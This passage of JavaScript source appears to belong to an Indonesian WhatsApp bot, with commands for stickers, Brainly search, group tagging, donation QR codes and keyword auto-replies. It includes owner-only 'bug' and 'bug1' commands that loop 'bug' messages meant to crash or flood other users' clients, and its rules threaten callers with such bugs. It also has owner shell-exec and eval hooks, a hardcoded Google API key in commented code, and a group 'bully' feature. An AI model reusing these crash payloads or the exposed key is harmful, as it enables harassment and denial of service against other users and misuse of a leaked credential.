			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await xdev.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return setReply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			xdev.sendMessage(from, buffer, image)
			fs.unlinkSync(ran)
			})
			break
	
	
			
			
	
	
	case 'semoji':
			if (!q) return setReply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
    
    
	
            




case 'listonline':
             if (!isGroup) return setReply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(xdev.chats.get(ido).presences), xdev.user.jid]
             xdev.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: dev, contextInfo: { mentionedJid: online }})
             } catch (e) {
             setReply(`${e}`)
}
break


case 'listgc':
const txs = xdev.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${xdev.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
setReply(txs)
break
            
case 'listpc': {
let anu = await xdev.chats.all().filter(v => v.jid.endsWith('.net')).map(v => v.jid)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
jumlah = []
for (let i of anu) {
teks += `⬡ *Nama :* ${xdev.getName(i)}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
jumlah.push(i)
}
setReply(teks)
}
break
            
           
           
           
            

 	

     
case 'brainly':{
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) setReply( 'Soalnya?')
nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
foto = await getBuffer(nana)   
try{
  var res = await brainly.search('id', q)
} catch (err) {
var res = await brainly.searchWithMT('id', `${q}`)
}
teks =`_*BRAINLY*_\n\n`


   teks += res.map(({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map((v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`).join``}`).join(`
═════════════════
`)
 
 teks +=`\n\n_Thanks for choosing Brainly_`
 
let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
sendButLocation(from, teks, `© ${fake1}`, foto, mok, {contextInfo: forward})             
limitAdd(senderNumber, user)
}
break
			
			
			


  

           
        
        
           


  
	case 'term':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
			if (!q) return setReply(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return setReply(`SELF-BOT:~ ${err}`)
			if (stdout) {
			setReply(stdout)
			}
			})
		    break 
		
		
    case 'join':    
    try{
                          if (!isOwner)return setReply(`Perintah ini Khusus owner`) 
                          if (args.length < 1) return setReply(`Kirim perintah *${prefix}join* link grup`)
                          if(!isGroup){
                          if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return setReply(mess.error.Iv)
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)
                         
                          setReply(`_Succses Join Group!_`)
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })
                           
                            setReply('*Successfully Entered Group*')
                            }
                           }catch (err){
						console.log(err)
						return setReply("Link Error")
					}
                           break
                 
                 
                case 'ovo':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/ovo.jpg'), image, {quoted: setQuoted})
                    break 
                case 'gopay':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/gopay.jpg'), image, {quoted: setQuoted})
                    break 
                     case 'dana':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/dana.jpg'), image, {quoted: setQuoted})
                    break 
                 
    

            
case 'runtime':
case 'test':   
run = process.uptime() 
teks = runtime(run)            
teksnya =`Bot aktif selama ${teks}`
setReply(teksnya)
break  
      
      
	case 'speed':
	case 'ping':
			const timestamp = speed();
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
			xdev.sendMessage(from, pingnya, text, {quoted: setQuoted})
			})
			break  
			
			
    case 'totag':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    
    
    
    
    case 'inspect':
    if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            try{
            setReply(mess.wait)
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
            if (!q) return setReply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             xdev.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
             limitAdd(senderNumber, user)
             } catch (err){
						console.log(err)
						setReply(`${err}`)
					}
			
             break
             
case 'd':
case 'del':
case 'delete':
if (mentionByReply == botNumber) {
xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
} else  {
setReply("Reply pesan bot nya *Tomlol!* 😡")
}
break
            
					
case 'sider':
if (mentionByReply == botNumber) {
infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
} else {
setReply("Reply pesan bot nya *Tomlol!* 😡")
}
break

case 'banchat':
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if (isBanchat) return setReply(`udah di ban`)
addDataId(from, command, DataId)
setReply(`Bot berhasil Ban di group ini`)
break


					

case 'unbanchat':
if (!isOwner) return onlyOwner() 
try {
if (!isBanchat) return setReply(`udah di UnBan`)
removeDataId ("banchat", from, DataId)
setReply(`Bot telah di Unban di group ini`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break




case 'infoall': case 'tagall':
 if(isExtream) return
if(!q) return setReply('Ingfonya apa?')
if (!isGroup) return setReply(mess.only.group)
var nom = dev.participant
members_id = []
teks = '\n'
for (let mem of groupMembers) {
teks += `┣ ⬣@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(`
*From :* ${pushname}

 Info :  ${q}

Total Member : ${groupMembers.length} 

┏━⬣`+teks+`┗━⬣`, members_id, false)
break


case 'donasi':
console.log('DONASI')
xdev.sendMessage(from, donasi.dodo(prefix), text, {quoted: dev})
break
 
 
 case 'sayang':
if(!autoWelcome){
if(!isWelkom) return
}
if(isExtream) return
sendMess(`Ciee di sayang\nUntuk @${q} kamu di sayang😘 sama ${pushname} awokawok`)
break


case 'peluk':
if(!autoWelcome){ if(!isWelkom) return }
if(isExtream) return
sendMess(`Ciee di peluk\nuntuk @${q} kamu mau gak di peluk sama ${pushname} :v`)
break

case 'gebukin':
if(!autoWelcome){
if(!isWelkom) return
 }
if(isExtream) return
setReply(`@${q} Berhasil di gebukin dan sekarang babak belur + bonyok :v`)
break


case 'pukulin':
if(!autoWelcome){
 if(!isWelkom) return
}
if(isExtream) return
setReply(`@${q} Berhasil di pukulin dan sekarang dia bonyok-bonyok :v`)
break

case 'santet':
if(!autoWelcome){
if(!isWelkom) return
 }
if(isExtream) return
setReply(`Berhasil menyantet si @${q} dan sekarang dia mencret paku`)
break

case 'kocok':
if(!autoWelcome){
if(!isWelkom) return
}
if(isExtream) return
setReply(`*ERROR*`)
break
 
case "owner":
stst = await xdev.getStatus(`${nomerOwner}@c.us`)
stst = stst.status == 401 ? '' : stst.status
sendKontak(from, nomerOwner, namalu, stst);
break;
 
 
case 'shorturl':
case 'tinyurl':{
if (args.length < 1) return setReply(`Masukkan link`)
if (!isUrl) return setReply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
shorti = `*Result : ${okok}*`
setReply(shorti)
}
break
 
 

 
                 
 
 
case 'sewabot':
case 'sewalonte':
case 'sewa':
if(isExtream) return
teks = sewabot.dada(prefix, settings, pushname, ucapanWaktu)      
gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
sendButLocation(from, teks,copyright, thumb, gbutsan)                          
                         break
 

case 'bug1':
if (!isOwner) return setReply(mess.only.ownerB)
if (args.length < 1) return setReply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
xdev.toggleDisappearingMessages(from, 0)
}
setReply('Sukses send bug sebanyak '+args.join(' '))
break



/*
case 'emojimix': {
	        if (!q) setReply( `Example : ${prefix + command}`)
		let [emoji1, emoji2] = q.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		sendStickerUrl(from, res)
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
*/

case 'bug':
if (!isOwner) return setReply(mess.only.ownerB)
if (args.length < 1) return setReply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
 sendBug(from)
}
setReply('Sukses send bug sebanyak '+args.join(' '))
break











 
 
 
 
 
 
 
 
 

   

 
 
default:
                                                      
if (isCmd && !multi && !allpref && !nopref && !isSimi || !isSimi && !allpref && !nopref && isCmd && multi && !dev.key.fromMe) {
if(autovn){  
sendvn(gakada)
} else 
if(autosticker) {
const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
                                           './respon/sticker10.webp',
                                           './respon/sticker11.webp','./respon/sticker13.webp',
                                           './respon/sticker21.webp']                   
const su = kta[Math.floor(Math.random() * kta.length)]
halo = fs.readFileSync(`${su}`)
xdev.sendMessage(from, halo, sticker, {quoted: dev, contextInfo : forward})
} else if(typing){
setReply(textcmd )
}
}

					
//Simi simi            
if(isGroup && isCmd && isSimi && !dev.key.fromMe && !isSticker && !isAudio && !isMedia ){
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
setReply(sami) 
}

}


//-------------------BATAS GARIS KATULISTIWA-----------------\\


	


	
//Waktu sewa group      
if(isGroup && dev.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, bot akan keluar otomatis")){
await sendMess("Bye")
setTimeout( () => {
xdev.groupLeave(from)
},4000)
}
	
//Jika ada yg kirim pesan "p" botz akan respon
if (salam.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (isOwner) return 
if(isExtream) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){ 
sendvn(ucapbot)
} else if(autosticker) {
sendSticker(ucapsalam)
} else {
setReply("Ucap salam napah")
}
}
				
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(walaikumsalam)
} else if(autosticker) {
sendSticker1(kumsalam)
} else {
setReply("Walaikumsalam kak")
}
}
				
//Jika ada yg kirim pesan menu bot akan respon
if (menu.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (isOwner) return 
setReply(`Hai kak ${pushname} untuk mengakses menu ketik ${prefix}menu ya 😉`)
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
				
//Jika ada yg toxic botz akan merespon✓
if (!isOwner && bad.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(astaga)
} else if(autosticker) {
await sendSticker(istigfar)
} else {
daui = await getBuffer('https://a.top4top.io/m_2213dvvcg0.mp3')
await xdev.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true})
await setReply("Astagfirloh oni chan")
}
}
				
//Jika ada yg bilang bot maka botz akan merespon✓
if (badud.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn ) {
sendvn(ucapbot)
} else {
sendMess(hayuk)
}
}
				
//Jika ada yg bilang hallo maka botz akan merespon✓
if (katahai.includes(messagesC)) {
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) return sendvn(moshimos)
}

//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
if(autovn === true) return sendvn(oahyo)
setReply(`${ucapanWaktu} kak 🙂`)
}
				     
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
if(autovn) {
sendvn(oyasumi)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
          
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) {
sendvn(koniciwa)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
           
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(lopyoutoo)
} else {
setReply("??")
}
}
				
//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`, text, { quoted: setQuoted, contextInfo: forward })
 }
                   
//Jika ada yang tag nomer owner
if (!isOwner && isGroup && budy.includes(nomerOwner)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (itsMe) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
xdev.sendMessage(from, su, text, { quoted: dev })
}
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
 if (budy.includes(kasih) || selectedButton == 'Thanks' ) {
if(isExtream) return
if(dev.key.fromMe) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autosticker) return sendSticker(samasama)
setReply(`Sama sama kak ${pushname}`)
}
}
                 

//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
if(budy.startsWith(`${prefix}freeoneday`)){
console.log("freeoneday detected")
} else {
teks = "*Untuk memasukan bot ke group*\n*Kamu harus sewa bot telebih dahulu*\n\n" + sewabot.dada(prefix, settings, pushname, ucapanWaktu)
gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
sendButLocation(from, teks, `© ${fake1}`, thumb, gbutsan) 
}
}

//Ketika ada yang minta save
if(!isGroup && budy.startsWith("sv")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
}
	
	
//Bullying member bamru
if (body.startsWith(`${prefix}bullyuk`)){
if(!autoWelcome){
if(!isWelkom) return setReply("Error")
}
if(isExtream) return
setReply(`Hayuk ah`)     
sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
{buttonId: `${prefix}${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1},
{buttonId: `${prefix}${bully3} ${q}`, buttonText: { displayText: `di ${bully3}`,},type: 1}]);
} 



//Info Botz
if (selectedButton == 'INFO BOTZ') {
if(isExtream) return       
var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
const timestampu = speed();
var total = math(`${groups.length} ${privat.length}`)
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
					
menunya = info1.bot(calender, wa_version, mcc, mnc, os_version, device_manufacturer, device_model,os,ram2,privat,groups,totalchat,latensi,gender,fake,nomerOwner)
let info = fs.readFileSync('./stik/bot.jpg')
options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: fs.readFileSync('./stik/bot.jpg'), mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
if(setmenu === "document") {
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), gbutsan, options2)
} else  {
sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/bot.jpg'), gbutsan, {contextInfo: forward})             
}
} 

//Kode Qr
if (selectedButton == 'KODE QR') {
if(isExtream) return
sendButMessage(from, `KODE QR YANG TERSEDIA`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}gopay`, buttonText: {displayText: `ɢᴏᴘᴀʏ`,},type: 1},
{buttonId: `${prefix}dana`, buttonText: {displayText: `ᴅᴀɴᴀ`,},type: 1},
{buttonId: `${prefix}ovo`, buttonText: { displayText: `ᴏᴠᴏ`,},type: 1}]);
} 

//Developer
if (selectedButton == 'DEVELOPER') {
if(isExtream) return
stst = await xdev.getStatus(`${Ownerin.split("@")[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
yahu = xdev.contacts[Ownerin] != undefined ? xdev.contacts[Ownerin].notify = undefined ? PhoneNumber('+' + Ownerin.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[Ownerin].notify || xdev.contacts[Ownerin].vname : PhoneNumber('+' + Ownerin.replace('@s.whatsapp.net', '')).getNumber('international')
sendKontak(from, `${Ownerin.split("@")[0]}`, yahu, stst);   
setReply("Tuh developer aku\nIngat! dia tuh Developer bukan bot,\nDia yang memperbaikin semua fitur yang error,\nkalo ada fitur error bisa chat ke Developer atau pakai fitur reportbug") 
} 

//Youtube Channel
 if (selectedButton == 'YOUTUBE') {
 if(isExtream) return
console.log('YOUTUBE')
let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
teks = `Nih youtube Developer aku 🤗\nLink: https://youtube.com/watch?v=TOmXzkWuCWk`
nana = `https://i.ytimg.com/vi/TOmXzkWuCWk/mqdefault.jpg`
foto = await getBuffer(nana)
options1 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: foto, mediaUrl:`https://youtube.com/watch?v=TOmXzkWuCWk`}}}
Sendbutdocument(from, teks,copyright, fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options1)
}

//Rules Bot
if (selectedButton == 'RULES') {
 teks =`
Syarat dan Ketentuan menggunakan *${fake}*

1. Nama dan nomer user ${fake}
     akan Kami simpan di dalam 
     server selama bot aktif
     
2. Data akan di hapus ketika bot Offline
     atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar, 
     video, file, audio, dan dokumen 
     yang kamu kirim ke ${fake}
     
4. Kami tidak akan pernah meminta users 
     untuk memberikan informasi pribadi
     
5. Jika menemukan Bug/Error silahkan 
     langsung lapor ke Owner atau Developer
     atau bisa juga memakai fitur _*reportbug*_
     
6. Beberapa fitur mungkin ada yang error, 
     jadi tunggu sampai developer 
     meperbaiki fitur tersebut
         
8. Bot ini sudah di lengkapi dengan
     fitur _*Auto Report Bug*_ jika terjadi
     error maka bot akan auto report ke
     developer, terkecuali error yang
     menyebabkan bot mati, maka user
     harus lapor ke developer
     
7. Bot ini juga sudah di lengkapi dengan 
     Fitur Anti Spam jika kamu terdeteksi 
     melakukan spam, maka Bot tidak
     akan menanggapi kamu selama 20 detik
    
9. User dilarang keras menelpon bot!
     jika melanggar maka kamu akan terkena 
     banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
       meminta untuk di save nomernya`

let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
sendButLocation(from, teks, `© ${fake1}`, fs.readFileSync('./stik/bot.jpg'), mok, {contextInfo: forward})             
}


//Exec
if (budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return onlyOwner()
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
setReply(stdout)
}
})
}

//Evaluate
if (budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return onlyOwner()
try {
return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
setReply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return onlyOwner()
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
setReply(String(e))
}
}

 
if (timeWib >= '04:00' && timeWib <= '04:10') {
console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
}
if (timeWib >= '05:00' && timeWib <= '05:10') {
console.log(color(`[${fake}]`, 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
}
if (timeWib >= '06:00' && timeWib <= '06:10') {
console.log(color(`[${fake}]`, 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
}
if (timeWib >= '11:00' && timeWib <= '11:10') {
console.log(color(`[${fake}]`, 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
}
if (timeWib >= '12:00' && timeWib <= '12:10') {
console.log(color(`[${fake}]`, 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
}
if (timeWib >= '15:00' && timeWib <= '15:10') {
console.log(color(`[${fake}]`, 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
}
